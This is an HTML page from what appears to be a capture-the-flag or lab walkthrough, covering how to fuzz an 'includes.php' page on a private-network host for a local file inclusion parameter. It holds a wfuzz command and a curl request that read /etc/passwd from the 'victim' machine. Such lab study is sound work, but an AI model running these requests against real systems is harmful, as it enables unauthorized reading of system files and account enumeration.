@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>3.2 Fuzzing</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>3.2 Fuzzing</h1><br/><p>• </p><p>    The “includes.php” page is blank. You can try to fuzz it to check out what parameter can be used for a LFI.</p><p></p><p>1. Run the following command.</p><p>    <div class="codebox"><pre>$ wfuzz -c --hc=404 --hh=2 -t 100 -w <span style="color:#a52a2a;font-weight:700">/</span>usr<span style="color:#a52a2a;font-weight:700">/</span>share<span style="color:#a52a2a;font-weight:700">/</span>wordlists<span style="color:#a52a2a;font-weight:700">/</span>dirbuster<span style="color:#a52a2a;font-weight:700">/</span>directory-list-2.3-medium.txt -u <span style="color:#ff00ff;font-weight:400">&#39;http://192.168.12.70/includes.php?FUZZ=/etc/passwd&#39;</span></pre></div>    </p><p></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1082-1.png" alt="images/1082-1.png" /></p><p>    </p><p>2. You can list files from the victims machine.</p><p>    <div class="codebox"><pre>$ curl -s -X GET http<span style="color:#a52a2a;font-weight:700">://</span>192.168.12.70<span style="color:#a52a2a;font-weight:700">/</span>includes.php?display_page=<span style="color:#a52a2a;font-weight:700">/</span>etc<span style="color:#a52a2a;font-weight:700">/passwd</span><br /></pre></div>     </p><p></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1082-2.png" alt="images/1082-2.png" /></p><p>    </p><p>    You can see there&#39;s a user called “john”.</p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
+</body>
+</html>
